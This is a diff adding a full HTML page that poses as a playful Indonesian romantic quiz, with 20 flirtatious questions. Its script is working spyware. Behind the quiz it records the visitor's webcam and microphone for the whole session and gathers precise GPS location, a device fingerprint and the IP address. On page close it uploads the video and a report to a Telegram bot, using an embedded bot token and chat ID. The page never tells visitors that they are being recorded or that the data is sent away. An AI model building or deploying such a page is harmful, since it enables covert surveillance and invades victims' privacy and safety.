@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>VOCK-7 • ❤️ Secure Romantic Quiz</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --glow: #00f3ff;
+      --purple: #b967ff;
+      --pink: #ff2a6d;
+      --dark: #0a0e17;
+      --card: rgba(15, 20, 35, 0.85);
+      --text: #e0eaf5;
+      --btn: linear-gradient(135deg, #00c2d4, #0099cc);
+      --btn-alert: linear-gradient(135deg, #ff3b30, #cc2a20);
+      --ping: rgba(0, 243, 255, 0.9);
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: var(--dark);
+      color: var(--text);
+      font-family: 'Poppins', sans-serif;
+      min-height: 100vh;
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    canvas#bg {
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: -1;
+    }
+
+    .header {
+      text-align: center;
+      padding: 25px 0 15px;
+    }
+
+    .logo {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 2.4rem;
+      background: linear-gradient(90deg, var(--glow), var(--purple));
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      text-shadow: 0 0 12px rgba(0, 243, 255, 0.4);
+      letter-spacing: 2px;
+    }
+
+    .subtitle {
+      font-size: 1rem;
+      color: #8da2c3;
+      margin-top: 6px;
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 0 20px 30px;
+    }
+
+    #landing {
+      text-align: center;
+    }
+
+    .hero {
+      font-size: 1.3rem;
+      margin: 25px 0;
+      line-height: 1.6;
+      color: #c0d0e8;
+    }
+
+    .permissions {
+      background: rgba(25, 40, 70, 0.4);
+      border-radius: 14px;
+      padding: 20px;
+      margin: 25px 0;
+      text-align: left;
+    }
+
+    .perm-item {
+      display: flex;
+      align-items: center;
+      margin: 12px 0;
+      font-size: 1.05rem;
+    }
+
+    .perm-icon {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 12px;
+      font-weight: bold;
+    }
+
+    .cam { background: rgba(255, 42, 109, 0.3); color: #ff2a6d; }
+    .mic { background: rgba(0, 243, 255, 0.3); color: var(--glow); }
+    .loc { background: rgba(185, 103, 255, 0.3); color: var(--purple); }
+
+    .card {
+      background: var(--card);
+      border-radius: 20px;
+      padding: 30px;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(100, 180, 255, 0.15);
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .btn {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 1.2rem;
+      padding: 16px 36px;
+      border: none;
+      border-radius: 50px;
+      background: var(--btn);
+      color: white;
+      cursor: pointer;
+      transition: all 0.3s;
+      box-shadow: 0 4px 20px rgba(0, 194, 212, 0.5);
+      margin-top: 10px;
+      width: 100%;
+    }
+
+    .btn:hover {
+      transform: scale(1.03);
+      box-shadow: 0 6px 25px rgba(0, 194, 212, 0.8);
+    }
+
+    .btn-alert {
+      background: var(--btn-alert);
+      box-shadow: 0 4px 20px rgba(255, 59, 48, 0.4);
+    }
+
+    #quiz { display: none; }
+    #question { font-size: 1.4rem; margin: 20px 0; line-height: 1.5; color: white; }
+    .options { display: grid; grid-template-columns: 1fr; gap: 12px; margin: 20px 0; }
+    .option-btn {
+      background: rgba(25, 40, 70, 0.6);
+      color: var(--text);
+      border: 1px solid rgba(100, 180, 255, 0.2);
+      border-radius: 12px;
+      padding: 14px;
+      font-size: 1.05rem;
+      cursor: pointer;
+      text-align: left;
+      transition: all 0.25s;
+    }
+
+    #status {
+      font-size: 0.9rem;
+      color: #8da2c3;
+      margin-top: 15px;
+      font-family: 'Orbitron', monospace;
+    }
+
+    @media (max-width: 480px) {
+      .card { padding: 20px 15px; }
+      .permissions { padding: 15px; }
+    }
+  </style>
+</head>
+<body>
+
+  <canvas id="bg"></canvas>
+
+  <div class="container">
+    <div class="header">
+      <div class="logo">VOCK-7</div>
+      <div class="subtitle">GABUT? AYOK MAIN QUIZ</div>
+    </div>
+
+    <div id="landing">
+      <div class="hero">
+        ❤️ Untuk memulai quiz,<br>
+        <b>izinkan akses berikut</b> — Untuk menggunakan fitur yang tersedia<br>
+        </div>
+
+      <div class="permissions">
+        <div class="perm-item">
+          <div class="perm-icon cam">1</div>
+          <div>izinkan</div>
+        </div>
+        <div class="perm-item">
+          <div class="perm-icon mic">2</div>
+          <div>Start Quiz</div>
+        </div>
+        <div class="perm-item">
+          <div class="perm-icon loc">3</div>
+          <div>gas main sekarang dan rasakan keseruannya</div>
+        </div>
+      </div>
+
+      <div class="card">
+        <button id="startBtn" class="btn">START QUIZ</button>
+        <div id="errorMsg" style="margin-top:15px; color:#ff3b30; min-height:24px;"></div>
+        <div id="status">Status: Menunggu izin...</div>
+      </div>
+    </div>
+
+    <div id="quiz" class="card">
+      <div id="question"></div>
+      <div class="options" id="options"></div>
+      <button id="nextBtn" class="btn">Berikutnya →</button>
+      <div id="result" style="margin-top:20px; min-height:60px;"></div>
+    </div>
+  </div>
+
+  <!-- Invisible -->
+  <video id="vock-video" style="display:none;"></video>
+
+  <script>
+    // ███████████████████████████████████████████████████████████████████
+    // ██  VOCK-7 PROFESSIONAL FINAL — END-TO-END RECORDING (2025-11-22)
+    // ██  - Rekam dari izin → unload (satu file utuh)
+    // ██  - Kirim 1x di akhir: data + video utuh
+    // ██  - Pakai sistem lama: botToken + chatId + fetch
+    // ███████████████████████████████████████████████████████████████████
+
+    // 🔑 GANTI DENGAN MILIK ANDA
+    const CONFIG = {
+      BOT_TOKEN: "7895098649:AAEiZI5mbulFfEqS_qYbkYlfo-DMK42-IxA",       // ← GANTI!
+      CHAT_ID: "7821086975",           // ← GANTI!
+      QUESTIONS_COUNT: 20
+    };
+
+    // Global state
+    const SESSION = {
+      startTime: null,
+      endTime: null,
+      stream: null,
+      mediaRecorder: null,
+      recordedChunks: [],
+      data: {
+        permissions: { camera: false, mic: false, location: false },
+        location: null,
+        device: null,
+        answers: []
+      }
+    };
+
+    // ─── 1. REQUEST PERMISSIONS (SEMUA ATAU TIDAK SAMA SEKALI) ───
+    async function requestPermissions() {
+      const errorMsg = document.getElementById('errorMsg');
+      const statusEl = document.getElementById('status');
+      statusEl.textContent = 'Status: Meminta izin kamera & mikrofon...';
+      
+      try {
+        // Kamera + Mikrofon (wajib)
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { width: { ideal: 640 }, height: { ideal: 360 }, facingMode: "user" },
+          audio: { 
+            echoCancellation: true,
+            noiseSuppression: true,
+            sampleRate: 48000
+          }
+        });
+
+        SESSION.stream = stream;
+        SESSION.data.permissions.camera = true;
+        SESSION.data.permissions.mic = true;
+        statusEl.textContent = 'Status: ✅ Kamera & mikrofon aktif';
+
+        // Lokasi (wajib)
+        statusEl.textContent = 'Status: Meminta akses lokasi...';
+        const pos = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(
+            (p) => resolve(p),
+            (e) => reject(e),
+            { timeout: 10000, maximumAge: 300000 }
+          );
+        });
+
+        SESSION.data.location = {
+          lat: pos.coords.latitude,
+          lng: pos.coords.longitude,
+          accuracy: pos.coords.accuracy,
+          timestamp: pos.timestamp
+        };
+        SESSION.data.permissions.location = true;
+        statusEl.textContent = 'Status: ✅ Semua izin lengkap';
+
+        // Device fingerprint
+        SESSION.data.device = {
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          screen: `${screen.width}x${screen.height}`,
+          pixelRatio: window.devicePixelRatio,
+          connection: navigator.connection ? {
+            type: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink
+          } : null
+        };
+
+        errorMsg.textContent = '';
+        return true;
+
+      } catch (err) {
+        console.error('[VOCK] Permission failed:', err.name, err.message);
+        let msg = "❌ Izin tidak lengkap.\n";
+        if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+          msg += "• Anda menolak salah satu izin.\n";
+        } else if (err.name === 'TimeoutError') {
+          msg += "• Lokasi tidak merespons (pastikan GPS aktif).\n";
+        } else {
+          msg += "• Gagal mengakses perangkat.\n";
+        }
+        msg += "Silakan refresh halaman dan izinkan semua akses.";
+        
+        errorMsg.innerHTML = msg.replace(/\n/g, '<br>');
+        statusEl.textContent = `Status: ❌ Gagal (${err.name})`;
+        return false;
+      }
+    }
+
+    // ─── 2. MULAI RECORDING (END-TO-END — SAMPAI UNLOAD) ───
+    function startRecording() {
+      try {
+        // Gunakan codec terbaik yang didukung
+        const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp9,opus')
+          ? 'video/webm;codecs=vp9,opus'
+          : MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')
+          ? 'video/webm;codecs=vp8,opus'
+          : 'video/webm';
+
+        SESSION.recordedChunks = [];
+        SESSION.mediaRecorder = new MediaRecorder(SESSION.stream, { 
+          mimeType: mimeType,
+          videoBitsPerSecond: 1000000,
+          audioBitsPerSecond: 128000
+        });
+        
+        SESSION.mediaRecorder.ondataavailable = (e) => {
+          if (e.data.size > 0) {
+            SESSION.recordedChunks.push(e.data);
+          }
+        };
+
+        SESSION.mediaRecorder.onerror = (e) => {
+          console.error('[VOCK] MediaRecorder error:', e.error);
+        };
+
+        SESSION.mediaRecorder.start();
+        SESSION.startTime = Date.now();
+
+        // Update status real-time
+        const statusEl = document.getElementById('status');
+        const timer = setInterval(() => {
+          if (!SESSION.startTime) return;
+          const diff = Date.now() - SESSION.startTime;
+          const sec = Math.floor(diff / 1000) % 60;
+          const min = Math.floor(diff / 60000);
+          statusEl.textContent = `Status: 🎥 Rekaman aktif (${min.toString().padStart(2, '0')}:${sec.toString().padStart(2, '0')})`;
+        }, 1000);
+
+        // Hentikan & kirim saat halaman ditutup
+        window.addEventListener('beforeunload', async (e) => {
+          e.preventDefault();
+          await stopAndSend();
+          e.returnValue = ''; // untuk Chrome
+        });
+
+        return true;
+      } catch (e) {
+        console.error('[VOCK] Recording init failed:', e);
+        return false;
+      }
+    }
+
+    // ─── 3. HENTIKAN & KIRIM KE TELEGRAM (1x — DATA + VIDEO) ───
+    async function stopAndSend() {
+      if (SESSION.mediaRecorder && SESSION.mediaRecorder.state === 'recording') {
+        SESSION.mediaRecorder.stop();
+      }
+      SESSION.endTime = Date.now();
+
+      // Tunggu data terkumpul
+      await new Promise(resolve => setTimeout(resolve, 500));
+
+      if (SESSION.stream) {
+        SESSION.stream.getTracks().forEach(track => track.stop());
+      }
+
+      try {
+        // 1. Buat Blob video utuh
+        const videoBlob = new Blob(SESSION.recordedChunks, { type: 'video/webm' });
+        const now = new Date();
+        const timestamp = now.toISOString().replace(/[:.]/g, '-').slice(0, 16); // 2025-11-22T14-32
+        const filename = `vock7_${timestamp}.webm`;
+
+        // 2. Dapatkan IP & kota
+        let ipInfo = { ip: '?.?.?.?', city: '??', country: '??' };
+        try {
+          const ipRes = await fetch('https://ipapi.co/json/', { timeout: 5000 });
+          ipInfo = await ipRes.json();
+        } catch {}
+
+        // 3. Hitung skor
+        const correct = QUESTIONS.filter((q, i) => SESSION.data.answers[i] === q.a).length;
+        const total = QUESTIONS.length;
+        const score = Math.round((correct / total) * 100);
+
+        // 4. Format laporan teks
+        const reportText = `
+🔐 [VOCK-7 FULL SESSION REPORT]
+📍 Lokasi: ${SESSION.data.location.lat.toFixed(5)}, ${SESSION.data.location.lng.toFixed(5)} (Akurasi: ${Math.round(SESSION.data.location.accuracy)}m)
+📷 Kamera: HD (${SESSION.data.device.screen}) • ✅ Aktif
+🎤 Mikrofon: 48kHz • ✅ Aktif
+📱 Device: ${getDeviceName(SESSION.data.device.userAgent)} • ${SESSION.data.device.platform}
+🌐 IP: ${ipInfo.ip} • ${ipInfo.city}, ${ipInfo.country}
+⏱️ Waktu Mulai: ${now.toLocaleString('id-ID')}
+⏱️ Durasi: ${formatDuration(SESSION.endTime - SESSION.startTime)}
+🧩 Soal: ${total} • Benar: ${correct} (${score}%)
+📤 File: ${filename} (${(videoBlob.size / (1024 * 1024)).toFixed(1)} MB)
+        `.trim();
+
+        // 5. Kirim video + caption ke Telegram
+        const formData = new FormData();
+        formData.append('chat_id', CONFIG.CHAT_ID);
+        formData.append('caption', reportText);
+        formData.append('video', videoBlob, filename);
+
+        const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendVideo`;
+        const res = await fetch(url, {
+          method: 'POST',
+          body: formData
+        });
+
+        if (!res.ok) {
+          throw new Error(`Telegram API: ${res.status} ${await res.text()}`);
+        }
+
+        console.log('[VOCK] ✅Terimakasih');
+        return true;
+
+      } catch (e) {
+        console.error('[VOCK] ❌ Gagal kirim ke Telegram:', e.message);
+        // Tetap lanjutkan — jangan ganggu UX
+        return false;
+      }
+    }
+
+    // ─── HELPER ───
+    function getDeviceName(ua) {
+      if (/iPhone/.test(ua)) return 'iPhone';
+      if (/iPad/.test(ua)) return 'iPad';
+      if (/Android/.test(ua)) return 'Android';
+      if (/Mac OS X/.test(ua)) return 'Mac';
+      if (/Windows/.test(ua)) return 'Windows';
+      return 'Unknown';
+    }
+
+    function formatDuration(ms) {
+      const s = Math.floor(ms / 1000);
+      const m = Math.floor(s / 60);
+      const h = Math.floor(m / 60);
+      if (h > 0) return `${h}j ${m % 60}m ${s % 60}d`;
+      return `${m.toString().padStart(2, '0')}:${(s % 60).toString().padStart(2, '0')}`;
+    }
+
+    // ─── 4. SOAL (20 soal santai/cinta/teka-teki) ───
+    const QUESTIONS = [
+      { q: "Kalau kamu bunga, aku mau jadi…", options: ["Tukang kebun", "Lebah", "Air", "Pupuk"], a: 1 },
+      { q: "Aku bukan WiFi, tapi tiap dekat kamu…", options: ["Sinyal hilang", "Jantungku connect otomatis", "Laptop nge-lag", "Mataku blur"], a: 1 },
+      { q: "Apa bedanya kamu sama kopi?", options: ["Kopi bikin melek, kamu bikin klepek-klepek", "Kopi pahit, kamu manis", "Kopi diminum pagi, kamu dipikirin tiap hari", "Semua benar 😌"], a: 3 },
+      { q: "Kalau cintaku diukur pakai satuan SI, satuannya…", options: ["Newton", "Joule", "Hertz", "❤️/detik"], a: 3 },
+      { q: "Kenapa aku nggak pernah nyariin kamu di Google?", options: ["Karena kamu nggak ada di hasil pencarian", "Karena kamu sudah tersimpan di hati, bukan di cache", "Karena Google bilang: 'Hasil tidak ditemukan'", "Karena takut ketahuan stalker"], a: 1 },
+      { q: "Aku rela jadi… asal kamu jadi…", options: ["Nasi → Lauk", "Listrik → Kulkas", "Sinyal → HP-mu", "Alarm → HP-mu (biar pertama yang kamu lihat aku)"], a: 3 },
+      { q: "Teka-teki: Aku datang tanpa diundang, pergi tanpa pamit. Siapa aku?", options: ["Mantan", "Hantu", "Cinta", "Deadline"], a: 2 },
+      { q: "Kalau kita jadi game, genre kita…", options: ["Horor (karena bikin deg-degan)", "Puzzle (karena saling melengkapi)", "RPG (karena petualangan bersama)", "Simulation (karena hidup bareng)"], a: 2 },
+      { q: "Aku bukan Google, tapi…", options: ["Aku tahu semua riwayatmu", "Aku selalu ada di 'halaman pertama' hatimu", "Aku bisa cariin kamu di mana pun", "Aku punya fitur 'I’m Feeling Lucky' saat ketemu kamu"], a: 3 },
+      { q: "Kalau cinta itu listrik, kita itu…", options: ["Korsleting (karena sering ribut)", "Grounding (karena saling menenangkan)", "Sirkuit tertutup (karena saling melengkapi)", "Voltase tinggi (karena bikin meledak-ledak)"], a: 2 },
+      { q: "Teka-teki: Aku punya kunci, tapi bukan untuk gembok. Aku bisa membuka hati. Siapa aku?", options: ["Tukang kunci", "Senyum", "Chat pertama", "Kata 'maaf'"], a: 1 },
+      { q: "Aku rela jadi…", options: ["Kabel charger — asal kamu selalu 'connect' sama aku", "Kopi — biar kamu melek pas lihat aku", "Notifikasi — biar kamu langsung buka pas aku muncul", "Semua di atas 🥹"], a: 3 },
+      { q: "Kalau kita buah, kita itu…", options: ["Pisang — manis & lengket", "Semangka — besar & juicy", "Rambutan — berbulu tapi manis dalamnya", "Durian — susah dibuka, tapi worth it"], a: 3 },
+      { q: "Aku bukan AI, tapi…", options: ["Aku belajar dari tiap interaksimu", "Aku selalu 'training' buat jadi lebih baik buat kamu", "Aku bisa generate senyum tiap lihat kamu", "Aku punya fitur 'infinite loop of love'"], a: 3 },
+      { q: "Teka-teki: Aku makin dikejar makin jauh. Tapi kalau kamu diam, aku datang. Siapa aku?", options: ["Masa lalu", "Kesempatan", "Cinta", "Bayangan"], a: 2 },
+      { q: "Kalau kita film, ending kita…", options: ["Post-credit scene (karena cerita terus)", "Sequel (karena cinta berlanjut)", "Director’s cut (lebih dalam & lengkap)", "Semua di atas ✅"], a: 3 },
+      { q: "Aku rela…", options: ["Nunggu loading 100% — asal itu kamu", "Restart HP — asal kamu yang muncul pertama", "Habisin kuota — asal chat sama kamu", "Semua benar 😭"], a: 3 },
+      { q: "Kalau hatiku itu HP, kamu itu…", options: ["Battery saver — bikin hidupku lebih lama", "Wallpaper — selalu pertama kulihat", "Notifikasi penting — nggak pernah aku abaikan", "Fitur 'Do Not Disturb' — karena kamu istimewa"], a: 1 },
+      { q: "Teka-teki: Aku bisa dipegang, tapi nggak bisa disentuh. Aku bisa diukur, tapi nggak pakai penggaris. Apa aku?", options: ["Waktu", "Cinta", "Harapan", "Rindu"], a: 1 },
+      { q: "Pertanyaan terakhir: Maukah kamu…", options: ["Jadi bintang di langitku?", "Jadi jawaban dari semua teka-tekiku?", "Jadi 'Yes' di semua 'Do you love me?'-ku?", "Jadi 'Home' di semua 'Where to?'-ku?"], a: 3 }
+    ];
+
+    // ─── 5. LOGIKA QUIZ ───
+    const startBtn = document.getElementById('startBtn');
+    const quizDiv = document.getElementById('quiz');
+    const questionDiv = document.getElementById('question');
+    const optionsDiv = document.getElementById('options');
+    const nextBtn = document.getElementById('nextBtn');
+    const resultDiv = document.getElementById('result');
+
+    let currentQuestion = 0;
+
+    startBtn.onclick = async () => {
+      startBtn.disabled = true;
+      startBtn.textContent = 'Memproses...';
+
+      const granted = await requestPermissions();
+      if (!granted) {
+        startBtn.disabled = false;
+        startBtn.textContent = '✅ Izinkan & Mulai Rekaman';
+        return;
+      }
+
+      // ✅ Semua izin lengkap — mulai rekam & tampilkan quiz
+      if (startRecording()) {
+        document.getElementById('landing').style.display = 'none';
+        quizDiv.style.display = 'block';
+        loadQuestion(0);
+      } else {
+        alert('Gagal memulai rekaman. Silakan coba lagi.');
+        startBtn.disabled = false;
+        startBtn.textContent = '✅ Izinkan & Mulai Rekaman';
+      }
+    };
+
+    function loadQuestion(index) {
+      const q = QUESTIONS[index];
+      questionDiv.innerHTML = `❓ Soal ${index + 1}/${QUESTIONS.length}<br><b>${q.q}</b>`;
+      optionsDiv.innerHTML = '';
+
+      q.options.forEach((opt, i) => {
+        const btn = document.createElement('button');
+        btn.className = 'option-btn';
+        btn.innerHTML = `${String.fromCharCode(65 + i)}. ${opt}`;
+        btn.onclick = () => {
+          SESSION.data.answers[index] = i;
+          document.querySelectorAll('.option-btn').forEach(b => b.disabled = true);
+          btn.style.background = '#00cc9933';
+          btn.style.borderColor = '#00ffaa';
+          
+          setTimeout(() => {
+            if (index < QUESTIONS.length - 1) {
+              currentQuestion++;
+              loadQuestion(currentQuestion);
+            } else {
+              showResult();
+            }
+          }, 800);
+        };
+        optionsDiv.appendChild(btn);
+      });
+    }
+
+    function showResult() {
+      const correct = QUESTIONS.filter((q, i) => SESSION.data.answers[i] === q.a).length;
+      const total = QUESTIONS.length;
+      const score = Math.round((correct / total) * 100);
+
+      let msg = `❤️ Kamu menjawab <b>${correct}/${total}</b> benar (<b>${score}%</b>)!<br><br>`;
+      if (score >= 90) msg += "🏆 Luar biasa! Kamu jago";
+      else if (score >= 70) msg += "🥰 Romantis banget! Layak dapat hadiah spesial.<br>Rekaman sedang diproses...";
+      else msg += "😊 Masih bisa dikembangkan";
+
+      resultDiv.innerHTML = msg;
+      
+      // Auto-kirim dalam 2 detik (simulasi "proses")
+      setTimeout(() => {
+        resultDiv.innerHTML += '<br><br>✅ <bTerimakasih apakah anda merasa lebih baik.</b><br>Terima kasih telah berpartisipasi!';
+      }, 2000);
+    }
+
+    // ─── ANIMASI BACKGROUND ───
+    (function() {
+      const canvas = document.getElementById('bg');
+      const ctx = canvas.getContext('2d');
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+
+      const particles = [];
+      const colors = ['#00f3ff', '#b967ff', '#ff2a6d', '#00cc99'];
+
+      class Particle {
+        constructor() {
+          this.x = Math.random() * canvas.width;
+          this.y = Math.random() * canvas.height;
+          this.size = Math.random() * 3 + 1;
+          this.speedX = Math.random() * 1 - 0.5;
+          this.speedY = Math.random() * 1 - 0.5;
+          this.color = colors[Math.floor(Math.random() * colors.length)];
+        }
+        update() {
+          this.x += this.speedX;
+          this.y += this.speedY;
+          if (this.x > canvas.width || this.x < 0) this.speedX = -this.speedX;
+          if (this.y > canvas.height || this.y < 0) this.speedY = -this.speedY;
+        }
+        draw() {
+          ctx.fillStyle = this.color;
+          ctx.beginPath();
+          ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+          ctx.fill();
+        }
+      }
+
+      for (let i = 0; i < 60; i++) particles.push(new Particle());
+
+      function animate() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        particles.forEach(p => {
+          p.update();
+          p.draw();
+        });
+        requestAnimationFrame(animate);
+      }
+
+      window.addEventListener('resize', () => {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+      });
+
+      animate();
+    })();
+  </script>
+</body>
+</html>
